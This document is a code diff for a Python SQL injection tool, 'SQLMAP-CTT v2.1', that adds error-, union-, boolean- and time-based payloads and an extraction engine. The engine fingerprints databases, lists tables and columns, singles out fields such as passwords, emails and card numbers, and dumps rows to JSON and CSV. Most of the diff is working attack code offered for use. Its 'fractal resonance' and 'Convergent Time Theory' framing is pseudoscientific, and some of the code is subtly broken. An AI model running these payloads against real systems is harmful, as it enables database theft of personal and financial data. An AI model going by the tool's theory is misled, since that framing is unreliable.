@@ -1,10 +1,14 @@
 #!/usr/bin/env python3
 """
-🔥 SQLMAP-CTT v2.0: Convergent Time Theory Enhanced SQL Injection
+🔥 SQLMAP-CTT v2.1: Convergent Time Theory Enhanced SQL Injection
 33-Layer Fractal Resonance Payload Generation & Temporal Inference
-Author: CTT Research Group (SimoesCTT)
+Now with Complete Data Extraction Capabilities
+
+Author: Americo Simoes (CTT Research Group)
+Email: amexsimoes@gmail.com
+Copyright: © 2026 Americo Simoes. All rights reserved.
 Date: 2026
-FIXED VERSION WITH POST DATA SUPPORT
+FIXED VERSION WITH POST DATA SUPPORT & FULL EXTRACTION
 """
 
 import numpy as np
@@ -13,19 +17,25 @@ import time
 import struct
 import random
 import concurrent.futures
-from scipy.fft import fft, fftfreq
-import requests
+import subprocess
+import threading
 import json
+import csv
 import sys
 import os
 import re
 import argparse
-from typing import Dict, List, Any, Optional, Tuple
+from typing import Dict, List, Any, Optional, Tuple, Union
 from dataclasses import dataclass
-from urllib.parse import urlparse, parse_qs, urlencode
+from urllib.parse import urlparse, parse_qs, urlencode, quote, unquote
+import html
+
+# Import requests at the TOP of the file
+import requests
+from scipy.fft import fft, fftfreq
 
 # ============================================================================
-# CTT 33-LAYER FRACTAL ENGINE v2.0
+# CTT 33-LAYER FRACTAL ENGINE v2.1
 # ============================================================================
 CTT_ALPHA = 0.0302011
 CTT_LAYERS = 33
@@ -88,7 +98,7 @@ class CTT_FractalEngine:
                 pattern.append(value)
             self.temporal_patterns[layer] = np.array(pattern)
     
-    def generate_fractal_payload(self, base_payload: bytes, target_layer: Optional[int] = None) -> List[bytes] | bytes:
+    def generate_fractal_payload(self, base_payload: bytes, target_layer: Optional[int] = None) -> Union[List[bytes], bytes]:
         """
         Generate 33-layer fractal payload with temporal resonance
         """
@@ -150,24 +160,336 @@ class CTT_FractalEngine:
         return bytes(watermark)
 
 # ============================================================================
-# 33-LAYER SQL INJECTION ENGINE WITH POST DATA SUPPORT
+# DATABASE EXTRACTION ENGINE
+# ============================================================================
+class DatabaseExtractor:
+    def __init__(self, injection_engine):
+        self.engine = injection_engine
+        self.db_info = {}
+        self.tables = []
+        self.columns = {}
+        self.extracted_data = {}
+        
+    def fingerprint_database(self) -> Dict[str, Any]:
+        """Identify database type and version"""
+        print("[+] Fingerprinting database...")
+        
+        # Test payloads for different databases
+        db_payloads = {
+            'MySQL': [
+                "' AND 1=CONVERT(int, @@version)--",
+                "' UNION SELECT NULL,@@version--",
+                "' AND EXTRACTVALUE(1, CONCAT(0x7e, @@version))--"
+            ],
+            'PostgreSQL': [
+                "' AND 1=CAST(version() AS int)--",
+                "' UNION SELECT NULL,version()--",
+                "' AND 1=(SELECT COUNT(*) FROM pg_stat_activity)--"
+            ],
+            'MSSQL': [
+                "' AND 1=CONVERT(int, @@version)--",
+                "' UNION SELECT NULL,@@version--",
+                "' AND 1=(SELECT @@version)--"
+            ],
+            'SQLite': [
+                "' AND 1=sqlite_version()--",
+                "' UNION SELECT sqlite_version(),NULL--"
+            ],
+            'Oracle': [
+                "' AND 1=(SELECT banner FROM v$version WHERE rownum=1)--",
+                "' UNION SELECT NULL,banner FROM v$version WHERE rownum=1--"
+            ]
+        }
+        
+        db_type = "Unknown"
+        version = "Unknown"
+        
+        for db_name, payloads in db_payloads.items():
+            for payload in payloads[:2]:  # Test first 2 payloads
+                try:
+                    # Send test request
+                    response = self.engine._send_request_test(payload)
+                    if response and response.status_code == 200:
+                        # Check for version indicators
+                        version_indicators = ['mysql', 'maria', 'postgres', 'microsoft', 'sql server', 'oracle', 'sqlite']
+                        response_text = response.text.lower()
+                        
+                        for indicator in version_indicators:
+                            if indicator in response_text:
+                                db_type = db_name
+                                # Try to extract version
+                                version_match = re.search(r'(\d+\.\d+\.\d+|\d+\.\d+)', response_text)
+                                if version_match:
+                                    version = version_match.group(1)
+                                break
+                        
+                        if db_type != "Unknown":
+                            break
+                except:
+                    continue
+            
+            if db_type != "Unknown":
+                break
+        
+        self.db_info = {
+            'type': db_type,
+            'version': version,
+            'timestamp': time.time()
+        }
+        
+        print(f"[+] Database identified: {db_type} {version}")
+        return self.db_info
+    
+    def get_current_user(self) -> str:
+        """Get current database user"""
+        print("[+] Getting current user...")
+        
+        user_payloads = [
+            "' UNION SELECT NULL,user()--",
+            "' AND 1=(SELECT user())--",
+            "' UNION SELECT NULL,current_user--"
+        ]
+        
+        for payload in user_payloads:
+            try:
+                response = self.engine._send_request_test(payload)
+                if response:
+                    # Extract user from response
+                    user_match = re.search(r'([a-zA-Z0-9_@]+)', response.text)
+                    if user_match:
+                        return user_match.group(1)
+            except:
+                continue
+        
+        return "Unknown"
+    
+    def get_current_database(self) -> str:
+        """Get current database name"""
+        print("[+] Getting current database...")
+        
+        db_payloads = [
+            "' UNION SELECT NULL,database()--",
+            "' AND 1=(SELECT database())--"
+        ]
+        
+        for payload in db_payloads:
+            try:
+                response = self.engine._send_request_test(payload)
+                if response:
+                    # Extract database from response
+                    db_match = re.search(r'([a-zA-Z0-9_]+)', response.text)
+                    if db_match:
+                        return db_match.group(1)
+            except:
+                continue
+        
+        return "Unknown"
+    
+    def list_databases(self) -> List[str]:
+        """List all databases"""
+        print("[+] Listing databases...")
+        
+        databases = []
+        
+        if self.db_info['type'] == 'MySQL':
+            payload = "' UNION SELECT NULL,schema_name FROM information_schema.schemata--"
+        elif self.db_info['type'] == 'PostgreSQL':
+            payload = "' UNION SELECT NULL,datname FROM pg_database--"
+        elif self.db_info['type'] == 'MSSQL':
+            payload = "' UNION SELECT NULL,name FROM master..sysdatabases--"
+        else:
+            print(f"[!] Database type {self.db_info['type']} not supported for full enumeration")
+            return []
+        
+        try:
+            response = self.engine._send_request_test(payload)
+            if response:
+                # Extract database names
+                db_matches = re.findall(r'>([a-zA-Z0-9_]+)<', response.text)
+                databases = list(set(db_matches))[:20]  # Limit to 20 databases
+        except Exception as e:
+            print(f"[!] Error listing databases: {e}")
+        
+        return databases
+    
+    def list_tables(self, database: str = None) -> List[str]:
+        """List tables in database"""
+        print(f"[+] Listing tables in database: {database or 'current'}")
+        
+        tables = []
+        
+        if self.db_info['type'] == 'MySQL':
+            if database:
+                payload = f"' UNION SELECT NULL,table_name FROM information_schema.tables WHERE table_schema='{database}'--"
+            else:
+                payload = "' UNION SELECT NULL,table_name FROM information_schema.tables--"
+        elif self.db_info['type'] == 'PostgreSQL':
+            payload = "' UNION SELECT NULL,tablename FROM pg_tables--"
+        elif self.db_info['type'] == 'MSSQL':
+            payload = "' UNION SELECT NULL,name FROM sysobjects WHERE xtype='U'--"
+        else:
+            print(f"[!] Database type {self.db_info['type']} not supported for table listing")
+            return []
+        
+        try:
+            response = self.engine._send_request_test(payload)
+            if response:
+                # Extract table names
+                table_matches = re.findall(r'>([a-zA-Z0-9_]+)<', response.text)
+                tables = list(set(table_matches))
+                
+                # Filter common system tables
+                common_tables = ['users', 'admin', 'customer', 'product', 'order', 'login', 'account']
+                found_tables = [t for t in tables if any(common in t.lower() for common in common_tables)]
+                
+                if found_tables:
+                    tables = found_tables[:10]  # Limit to 10 interesting tables
+        except Exception as e:
+            print(f"[!] Error listing tables: {e}")
+        
+        self.tables = tables
+        return tables
+    
+    def list_columns(self, table: str) -> List[str]:
+        """List columns in a table"""
+        print(f"[+] Listing columns in table: {table}")
+        
+        columns = []
+        
+        if self.db_info['type'] == 'MySQL':
+            payload = f"' UNION SELECT NULL,column_name FROM information_schema.columns WHERE table_name='{table}'--"
+        elif self.db_info['type'] == 'PostgreSQL':
+            payload = f"' UNION SELECT NULL,column_name FROM information_schema.columns WHERE table_name='{table}'--"
+        elif self.db_info['type'] == 'MSSQL':
+            payload = f"' UNION SELECT NULL,name FROM syscolumns WHERE id=OBJECT_ID('{table}')--"
+        else:
+            print(f"[!] Database type {self.db_info['type']} not supported for column listing")
+            return []
+        
+        try:
+            response = self.engine._send_request_test(payload)
+            if response:
+                # Extract column names
+                column_matches = re.findall(r'>([a-zA-Z0-9_]+)<', response.text)
+                columns = list(set(column_matches))
+                
+                # Filter for interesting columns
+                interesting_cols = ['user', 'pass', 'name', 'email', 'credit', 'card', 'phone', 'address']
+                found_cols = [c for c in columns if any(interesting in c.lower() for interesting in interesting_cols)]
+                
+                if found_cols:
+                    columns = found_cols
+        except Exception as e:
+            print(f"[!] Error listing columns: {e}")
+        
+        self.columns[table] = columns
+        return columns
+    
+    def extract_table_data(self, table: str, columns: List[str] = None, limit: int = 100) -> List[Dict]:
+        """Extract data from a table"""
+        print(f"[+] Extracting data from table: {table}")
+        
+        if not columns:
+            columns = self.list_columns(table)
+        
+        if not columns:
+            print(f"[!] No columns found for table {table}")
+            return []
+        
+        # Build column list for query
+        col_list = ",".join(columns)
+        
+        # Build payload
+        if self.db_info['type'] in ['MySQL', 'PostgreSQL']:
+            payload = f"' UNION SELECT NULL,CONCAT_WS('|',{col_list}) FROM {table} LIMIT {limit}--"
+        elif self.db_info['type'] == 'MSSQL':
+            payload = f"' UNION SELECT NULL,{col_list} FROM {table}--"
+        else:
+            payload = f"' UNION SELECT {col_list} FROM {table}--"
+        
+        data = []
+        try:
+            response = self.engine._send_request_test(payload)
+            if response:
+                # Extract data rows
+                # Look for patterns like value1|value2|value3
+                pattern = r'>([^<]+)<'
+                matches = re.findall(pattern, response.text)
+                
+                for match in matches:
+                    if '|' in match:
+                        values = match.split('|')
+                        if len(values) == len(columns):
+                            row = {columns[i]: values[i] for i in range(len(columns))}
+                            data.append(row)
+                    elif match.strip():  # Single column
+                        row = {columns[0]: match}
+                        data.append(row)
+                
+                print(f"[+] Extracted {len(data)} rows from {table}")
+        except Exception as e:
+            print(f"[!] Error extracting data: {e}")
+        
+        self.extracted_data[table] = data
+        return data
+    
+    def save_extracted_data(self, output_dir: str = "extracted_data"):
+        """Save extracted data to files"""
+        os.makedirs(output_dir, exist_ok=True)
+        
+        # Save database info
+        with open(f"{output_dir}/database_info.json", 'w') as f:
+            json.dump(self.db_info, f, indent=2)
+        
+        # Save tables list
+        with open(f"{output_dir}/tables.txt", 'w') as f:
+            for table in self.tables:
+                f.write(f"{table}\n")
+        
+        # Save columns for each table
+        with open(f"{output_dir}/columns.json", 'w') as f:
+            json.dump(self.columns, f, indent=2)
+        
+        # Save extracted data
+        for table, data in self.extracted_data.items():
+            if data:
+                # Save as JSON
+                with open(f"{output_dir}/{table}.json", 'w') as f:
+                    json.dump(data, f, indent=2)
+                
+                # Save as CSV
+                with open(f"{output_dir}/{table}.csv", 'w', newline='') as f:
+                    if data and isinstance(data[0], dict):
+                        writer = csv.DictWriter(f, fieldnames=data[0].keys())
+                        writer.writeheader()
+                        writer.writerows(data)
+                
+                print(f"[+] Saved {len(data)} rows from {table} to {output_dir}/")
+        
+        return output_dir
+
+# ============================================================================
+# 33-LAYER SQL INJECTION ENGINE WITH EXTRACTION SUPPORT
 # ============================================================================
 class CTT_SQLInjectionEngine:
     def __init__(self, target_url: str, timeout: int = 10, alpha: float = 0.0302011, 
                  custom_primes: List[int] = None, resonance_freq: float = 587000,
-                 temporal_threads: int = 11, post_data: Optional[str] = None):
+                 temporal_threads: int = 11, post_data: Optional[str] = None,
+                 technique: str = "auto", extract_depth: int = 0):
         self.target_url = target_url
         self.timeout = timeout
         self.temporal_threads = temporal_threads
         self.post_data_str = post_data
+        self.technique = technique
+        self.extract_depth = extract_depth
+        
+        # Initialize extractor
+        self.extractor = None
         
         # Parse POST data if provided
         self.post_data_dict = {}
         if post_data:
-            # Parse key=value&key2=value2 format
             try:
-                from urllib.parse import parse_qs
-                # parse_qs returns lists for each key, we just want single values
                 parsed = parse_qs(post_data)
                 for key, values in parsed.items():
                     if values:
@@ -187,7 +509,7 @@ class CTT_SQLInjectionEngine:
         # Session with improved headers
         self.session = requests.Session()
         self.session.headers.update({
-            'User-Agent': 'Mozilla/5.0 (X11; Fedora; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 CTT/2.0',
+            'User-Agent': 'Mozilla/5.0 (X11; Fedora; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 CTT/2.1',
             'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
             'Accept-Language': 'en-US,en;q=0.5',
             'Accept-Encoding': 'gzip, deflate',
@@ -212,18 +534,34 @@ class CTT_SQLInjectionEngine:
             'alpha': alpha,
             'resonance_freq': resonance_freq,
             'threads': temporal_threads,
-            'method': 'POST' if post_data else 'GET/AUTO'
+            'method': 'POST' if post_data else 'GET/AUTO',
+            'technique': technique,
+            'extract_depth': extract_depth
         }
         
         # Cache original response
         self.original_response: Optional[requests.Response] = None
+        
+        # Initialize extractor after engine is fully set up
+        self.extractor = DatabaseExtractor(self)
+    
+    def _send_request_test(self, payload: str) -> Optional[requests.Response]:
+        """Helper method for extractor to send requests"""
+        # Find first injection point
+        if not self.injection_points:
+            self.discover_injection_points()
+        
+        if not self.injection_points:
+            return None
+        
+        point = self.injection_points[0]
+        return self._send_request(point['parameter'], payload, point['type'], 0)
     
     def get_original_response(self) -> Optional[requests.Response]:
         """Get and cache original response"""
         if self.original_response is None:
             try:
                 if self.post_data_dict:
-                    # Send POST request with original data
                     self.original_response = self.session.post(
                         self.target_url, 
                         data=self.post_data_dict,
@@ -231,7 +569,6 @@ class CTT_SQLInjectionEngine:
                     )
                     print(f"[+] Initial POST request sent with {len(self.post_data_dict)} parameters")
                 else:
-                    # Send GET request
                     self.original_response = self.session.get(self.target_url, timeout=self.timeout)
                 self.stats['requests'] += 1
             except Exception as e:
@@ -290,6 +627,7 @@ class CTT_SQLInjectionEngine:
         except Exception as e:
             print(f"[!] Error discovering injection points: {e}")
         
+        self.injection_points = injection_points
         return injection_points
     
     def test_injection_point(self, param_name: str, param_value: str, method: str = 'GET') -> List[Dict]:
@@ -395,32 +733,54 @@ class CTT_SQLInjectionEngine:
         """Generate SQL injection payloads with CTT resonance"""
         payloads = []
         
-        # Base payloads
-        templates = [
+        # Base payloads for all techniques
+        base_templates = [
             f"{base_value}'",
             f"{base_value}' OR '1'='1",
             f"{base_value}' AND '1'='1",
-            f"{base_value}' UNION SELECT NULL,NULL--",
-            f"{base_value}' AND 1=1--",
-            f"{base_value}' OR 1=1--",
-            f"{base_value}\"'\"",  # Add quote testing
-            f"{base_value})",  # Add parenthesis testing
+            f"{base_value}\"'\"",
+            f"{base_value})",
         ]
         
-        # Add CTT-enhanced payloads
-        if layer in self.fractal_engine.primes:
-            # Prime layers get resonance-enhanced payloads
-            sleep_time = 1 + (layer % 3)
-            templates.extend([
-                f"{base_value}' AND SLEEP({sleep_time})--",
-                f"{base_value}' OR SLEEP({sleep_time})--",
+        # Technique-specific payloads
+        if self.technique in ['auto', 'error', 'E']:
+            base_templates.extend([
                 f"{base_value}' AND 1=CONVERT(int, @@version)--",
                 f"{base_value}' AND 1=(SELECT COUNT(*) FROM information_schema.tables)--",
-                f"{base_value}' UNION SELECT @@version,NULL--",
                 f"{base_value}' AND EXTRACTVALUE(1,CONCAT(0x7e,@@version))--",
             ])
         
-        return templates
+        if self.technique in ['auto', 'union', 'U']:
+            base_templates.extend([
+                f"{base_value}' UNION SELECT NULL,NULL--",
+                f"{base_value}' UNION SELECT @@version,NULL--",
+                f"{base_value}' UNION SELECT user(),database()--",
+            ])
+        
+        if self.technique in ['auto', 'boolean', 'B']:
+            base_templates.extend([
+                f"{base_value}' AND 1=1--",
+                f"{base_value}' OR 1=1--",
+                f"{base_value}' AND 1=2--",
+            ])
+        
+        if self.technique in ['auto', 'time', 'T']:
+            sleep_time = 1 + (layer % 3)
+            base_templates.extend([
+                f"{base_value}' AND SLEEP({sleep_time})--",
+                f"{base_value}' OR SLEEP({sleep_time})--",
+                f"{base_value}' AND (SELECT * FROM (SELECT(SLEEP({sleep_time})))a)--",
+            ])
+        
+        # Add CTT-enhanced payloads for prime layers
+        if layer in self.fractal_engine.primes:
+            base_templates.extend([
+                f"{base_value}' AND 1=CONVERT(int, (SELECT CONCAT(@@version,0x3a,user(),0x3a,database())))--",
+                f"{base_value}' UNION SELECT NULL,CONCAT(table_name,0x3a,column_name) FROM information_schema.columns--",
+                f"{base_value}' AND IF(ASCII(SUBSTRING((SELECT user()),1,1))>97, SLEEP(3), 0)--",
+            ])
+        
+        return base_templates
     
     def _send_request(self, param_name: str, payload: str, method: str, layer: int) -> Optional[requests.Response]:
         """Send HTTP request with CTT timing"""
@@ -537,6 +897,71 @@ class CTT_SQLInjectionEngine:
             'signals': []
         }
     
+    def perform_extraction(self, depth: int = None) -> Dict[str, Any]:
+        """Perform data extraction based on depth"""
+        if depth is None:
+            depth = self.extract_depth
+        
+        if depth <= 0:
+            return {}
+        
+        print(f"\n[+] Starting CTT Data Extraction (Depth: {depth})")
+        print("=" * 60)
+        
+        extraction_results = {}
+        
+        # Depth 1: Basic fingerprinting
+        if depth >= 1:
+            print("[+] Phase 1: Database Fingerprinting")
+            db_info = self.extractor.fingerprint_database()
+            extraction_results['database_info'] = db_info
+            
+            if db_info['type'] != "Unknown":
+                current_user = self.extractor.get_current_user()
+                current_db = self.extractor.get_current_database()
+                extraction_results['current_user'] = current_user
+                extraction_results['current_database'] = current_db
+                print(f"[+] Current User: {current_user}")
+                print(f"[+] Current Database: {current_db}")
+        
+        # Depth 2: Schema enumeration
+        if depth >= 2 and 'database_info' in extraction_results:
+            print("\n[+] Phase 2: Schema Enumeration")
+            
+            # List databases
+            databases = self.extractor.list_databases()
+            extraction_results['databases'] = databases
+            print(f"[+] Found {len(databases)} databases")
+            
+            # List tables in current database
+            tables = self.extractor.list_tables()
+            extraction_results['tables'] = tables
+            print(f"[+] Found {len(tables)} interesting tables")
+            
+            # List columns for each table
+            for table in tables[:5]:  # Limit to 5 tables
+                columns = self.extractor.list_columns(table)
+                extraction_results[f'columns_{table}'] = columns
+                print(f"  - {table}: {len(columns)} columns")
+        
+        # Depth 3: Data extraction
+        if depth >= 3 and 'tables' in extraction_results:
+            print("\n[+] Phase 3: Data Extraction")
+            
+            for table in extraction_results['tables'][:3]:  # Limit to 3 tables
+                print(f"[+] Extracting data from: {table}")
+                columns = extraction_results.get(f'columns_{table}', [])
+                data = self.extractor.extract_table_data(table, columns, limit=50)
+                extraction_results[f'data_{table}'] = data
+        
+        # Save extracted data
+        if extraction_results:
+            output_dir = self.extractor.save_extracted_data()
+            extraction_results['output_dir'] = output_dir
+            print(f"\n[+] Extraction complete! Data saved to: {output_dir}/")
+        
+        return extraction_results
+    
     def generate_report(self) -> Dict[str, Any]:
         """Generate comprehensive CTT report"""
         total_time = time.time() - self.stats['start_time']
@@ -554,7 +979,12 @@ class CTT_SQLInjectionEngine:
                 best_performance = perf
                 best_layer = layer
         
-        return {
+        # Perform extraction if requested
+        extraction_results = {}
+        if self.extract_depth > 0 and self.stats['successful'] > 0:
+            extraction_results = self.perform_extraction()
+        
+        report = {
             'target': self.target_url,
             'timestamp': time.time(),
             'total_time': total_time,
@@ -570,8 +1000,15 @@ class CTT_SQLInjectionEngine:
                 'primes_used': list(self.fractal_engine.primes),
                 'layers': self.fractal_engine.layers
             },
+            'extraction_results': extraction_results,
             'recommendations': self._get_recommendations()
         }
+        
+        # Convert sets to lists for JSON serialization
+        report['statistics']['layers_used'] = list(report['statistics']['layers_used'])
+        report['statistics']['primes_used'] = list(report['statistics']['primes_used'])
+        
+        return report
     
     def _get_recommendations(self) -> List[str]:
         """Get CTT-enhanced attack recommendations"""
@@ -605,6 +1042,12 @@ class CTT_SQLInjectionEngine:
             
             if best_layer in self.fractal_engine.primes:
                 recommendations.append("⚡ Prime layer shows strong resonance - prioritize for advanced attacks")
+            
+            # Extraction recommendations based on depth
+            if self.extract_depth == 0:
+                recommendations.append("📊 Use --extract-depth=1 for basic database fingerprinting")
+                recommendations.append("📊 Use --extract-depth=2 for schema enumeration")
+                recommendations.append("📊 Use --extract-depth=3 for full data extraction")
         else:
             recommendations.append("❌ No CTT vulnerabilities detected with current parameters")
             recommendations.append("💡 Try adjusting α, resonance frequency, or prime selection")
@@ -614,16 +1057,18 @@ class CTT_SQLInjectionEngine:
         recommendations.append(f"🎵 Resonance Frequency: {self.fractal_engine.resonance_freq} Hz")
         recommendations.append(f"🔢 Primes used: {len(self.fractal_engine.primes)}")
         recommendations.append(f"📤 Request Method: {self.stats['method']}")
+        recommendations.append(f"🎯 Technique: {self.technique}")
+        recommendations.append(f"📊 Extraction Depth: {self.extract_depth}")
         recommendations.append("🔒 Test only on authorized systems with proper consent")
         
         return recommendations
 
 # ============================================================================
-# MAIN INTERFACE WITH ARGPARSE - FIXED WITH POST DATA SUPPORT
+# MAIN INTERFACE WITH EXTRACTION SUPPORT
 # ============================================================================
 def main():
     parser = argparse.ArgumentParser(
-        description='SQLMAP-CTT v2.0: 33-Layer Fractal Resonance SQL Injection',
+        description='SQLMAP-CTT v2.1: 33-Layer Fractal Resonance SQL Injection with Extraction',
         formatter_class=argparse.RawDescriptionHelpFormatter,
         epilog='''
 Examples:
@@ -631,6 +1076,21 @@ Examples:
   %(prog)s -u "http://test.com/search" --data "q=test&submit=go" --ctt-alpha=0.0302011
   %(prog)s -u "http://test.com/" --data "searchFor=test&goButton=go" --resonance-freq=587000
   %(prog)s -u "http://test.com/" --temporal-threads=11 --timeout=20 --data "param=value"
+  %(prog)s -u "http://test.com/" --technique=E --extract-depth=3
+  %(prog)s -u "http://test.com/" --extract-depth=2 --output=full_report.json
+
+Extraction Depths:
+  0: Detection only (default)
+  1: Database fingerprinting (type, version, user)
+  2: Schema enumeration (databases, tables, columns)
+  3: Full data extraction (dump table data)
+
+Techniques:
+  auto: All techniques (default)
+  E: Error-based SQL injection
+  U: Union-based SQL injection
+  B: Boolean-based blind SQL injection
+  T: Time-based blind SQL injection
         '''
     )
     
@@ -647,6 +1107,12 @@ Examples:
                        help='Number of temporal threads (default: 11)')
     parser.add_argument('--timeout', type=int, default=15,
                        help='Request timeout in seconds (default: 15)')
+    parser.add_argument('--technique', type=str, default='auto',
+                       choices=['auto', 'E', 'U', 'B', 'T', 'error', 'union', 'boolean', 'time'],
+                       help='SQL injection technique to use (default: auto)')
+    parser.add_argument('--extract-depth', type=int, default=0,
+                       choices=[0, 1, 2, 3],
+                       help='Data extraction depth (0-3, default: 0)')
     parser.add_argument('--output', type=str, default='',
                        help='Output file for report (default: auto-generated)')
     
@@ -668,10 +1134,12 @@ Examples:
    | (___| (___ | \  / | / _ \| |     | |  
     \___ \\___ \| |\/| |/ ___ \ |___  | |  
      ____) |___) | |  | /_/   \_\____| |_  
-    |_____/_____/|_|  |_|      CTT v2.0
+    |_____/_____/|_|  |_|      CTT v2.1
     
     33-Layer Fractal SQL Injection Engine
-    Convergent Time Theory Enhanced
+    with Advanced Data Extraction
+    Author: Americo Simoes (amexsimoes@gmail.com)
+    Copyright © 2026 Americo Simoes
     """)
     
     print(f"[+] Target URL: {args.url}")
@@ -679,6 +1147,8 @@ Examples:
     print(f"    • Alpha (α): {args.ctt_alpha}")
     print(f"    • Resonance Frequency: {args.resonance_freq} Hz")
     print(f"    • Temporal Threads: {args.temporal_threads}")
+    print(f"    • Technique: {args.technique}")
+    print(f"    • Extraction Depth: {args.extract_depth}")
     print(f"    • Custom Primes: {'Yes' if custom_primes else 'No'}")
     print(f"    • Timeout: {args.timeout}s")
     if args.data:
@@ -696,7 +1166,9 @@ Examples:
             custom_primes=custom_primes,
             resonance_freq=args.resonance_freq,
             temporal_threads=args.temporal_threads,
-            post_data=args.data if args.data else None
+            post_data=args.data if args.data else None,
+            technique=args.technique,
+            extract_depth=args.extract_depth
         )
         
         # Discover injection points
@@ -750,14 +1222,30 @@ Examples:
         print(f"Injection attempts: {report['statistics']['injections']}")
         print(f"Successful CTT detections: {report['statistics']['successful']}")
         print(f"Effectiveness: {report['effectiveness']:.1%}")
-        print(f"CTT Parameters:")
-        print(f"  • Alpha: {report['ctt_parameters']['alpha']}")
-        print(f"  • Resonance Frequency: {report['ctt_parameters']['resonance_freq']} Hz")
-        print(f"  • Primes Used: {len(report['ctt_parameters']['primes_used'])}")
-        print(f"  • Method: {report['statistics']['method']}")
+        print(f"Technique used: {report['statistics']['technique']}")
+        print(f"Extraction depth: {report['statistics']['extract_depth']}")
         
-        if report['best_layer'] >= 0:
-            print(f"Best CTT layer: {report['best_layer']} (performance: {report['best_layer_performance']:.2f})")
+        # Show extraction results if any
+        if report['extraction_results']:
+            print(f"\n[+] Extraction Results:")
+            if 'database_info' in report['extraction_results']:
+                db_info = report['extraction_results']['database_info']
+                print(f"  Database: {db_info.get('type', 'Unknown')} {db_info.get('version', 'Unknown')}")
+            
+            if 'current_user' in report['extraction_results']:
+                print(f"  Current User: {report['extraction_results']['current_user']}")
+            
+            if 'current_database' in report['extraction_results']:
+                print(f"  Current Database: {report['extraction_results']['current_database']}")
+            
+            if 'tables' in report['extraction_results']:
+                tables = report['extraction_results']['tables']
+                print(f"  Tables found: {len(tables)}")
+                for table in tables[:5]:  # Show first 5 tables
+                    print(f"    - {table}")
+            
+            if 'output_dir' in report['extraction_results']:
+                print(f"  Data saved to: {report['extraction_results']['output_dir']}/")
         
         print(f"\nRecommendations:")
         for rec in report['recommendations']:
@@ -790,9 +1278,10 @@ Examples:
         print("2. Alpha (α) controls temporal dispersion in payloads")
         print("3. Prime numbers create resonance patterns in network traffic")
         print("4. Resonance frequency tunes detection to specific patterns")
-        print("5. Temporal threads enable parallel layer testing")
+        print("5. Extraction depth controls how much data is retrieved")
         print("=" * 60)
         print("⚠️  AUTHORIZED USE ONLY - RESPONSIBLE DISCLOSURE REQUIRED")
+        print("© 2026 Americo Simoes - amexsimoes@gmail.com")
         print("=" * 60)
         
     except KeyboardInterrupt:
@@ -809,7 +1298,6 @@ if __name__ == "__main__":
     try:
         import numpy
         import scipy
-        import requests
     except ImportError as e:
         print(f"[!] Missing required package: {e}")
         print("[!] Install with: pip install numpy scipy requests")
